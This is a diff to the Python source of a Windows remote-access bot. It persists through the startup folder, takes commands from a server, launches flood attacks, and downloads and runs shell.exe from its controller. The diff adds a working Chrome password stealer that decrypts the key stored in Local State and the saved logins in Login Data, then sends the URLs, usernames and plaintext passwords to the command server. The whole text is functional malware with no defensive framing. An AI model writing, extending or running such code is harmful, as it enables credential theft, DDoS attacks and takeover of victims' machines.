@@ -8,8 +8,16 @@ import random
 import multiprocessing
 import subprocess
 import base64
+import sqlite3
+import win32crypt
+import json
+import datetime
+from Crypto.Cipher import AES
 
 should_reconnect = True
+
+host = ''
+port = 443
 
 def copy_to_startup_directory():
     try:
@@ -57,6 +65,10 @@ def receive_messages(client_socket):
                 _, ip, threads, timer, port = data.split()
                 thread_attack(ip, int(threads), int(timer), int(port))
 
+            if data == 'extract':
+                print("Extracting Chrome Passwords...")
+                extract_passwords()
+
         except Exception as e:
             print(f"Error in receive_messages: {e}")
 
@@ -68,7 +80,7 @@ def receive_messages(client_socket):
 
 def rev_shell():
     # URL where shell.exe is hosted
-    url = "http://[server-ip]/shell.exe"
+    url = f"http://{host}/shell.exe"
     
     # Construct the download path with environment variable for temp directory
     username = os.getenv('USERNAME')  # Get the current username
@@ -87,9 +99,6 @@ def rev_shell():
         print(f"Failed to download or find {download_path}")
 
 def start_client():
-    host = '[server-ip]'
-    port = 443
-
     while should_reconnect:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -146,6 +155,81 @@ def thread_attack(ip, threads, timer, port):
         process.join()
 
     print("All attack processes completed.")
+
+def send_file_to_server(filename):
+    try:
+        with open(filename, "rb") as f:
+            file_content = f.read()
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((host, port))
+            client_socket.sendall(b"chrome_passwords.txt")  # Inform server about file type
+            client_socket.sendall(file_content)
+            print(f"Sent {filename} to server successfully.")
+    except Exception as e:
+        print(f"Error sending {filename} to server: {e}")
+
+def convert_chrome_timestamp(chromedate):
+    epoch_start = datetime.datetime(1601, 1, 1)
+    delta_microseconds = datetime.timedelta(microseconds=chromedate)
+    return epoch_start + delta_microseconds
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as file:
+        local_state = file.read()
+        local_state = json.loads(local_state)
+    
+    # decode the Base64 encryption key
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # remove DPAPI prefix
+    key = key[5:]
+    # return decrypted key that was originally encrypted
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_password(buff, key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
+        return decrypted_pass
+    except Exception as e:
+        print("Error decrypting password: ", e)
+        return ""
+
+def extract_passwords():
+    # Your existing function to extract Chrome passwords
+    key = get_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "default", "Login Data")
+    filename = "ChromePasswords.db"
+    shutil.copyfile(db_path, filename)
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    with open("chrome_passwords.txt", "w") as file:
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            username = row[1]
+            encrypted_password = row[2]
+            decrypted_password = decrypt_password(encrypted_password, key)
+            if username or decrypted_password:
+                file.write(f"Origin URL: {origin_url}\n")
+                file.write(f"Username: {username}\n")
+                file.write(f"Password: {decrypted_password}\n")
+                file.write("="*50 + "\n")
+    
+    cursor.close()
+    db.close()
+    os.remove(filename)
+    print("Passwords extracted and saved to chrome_passwords.txt")
+
+    # Send the extracted passwords file to the server
+    send_file_to_server("chrome_passwords.txt")
 
 if __name__ == "__main__":
     copy_to_startup_directory()
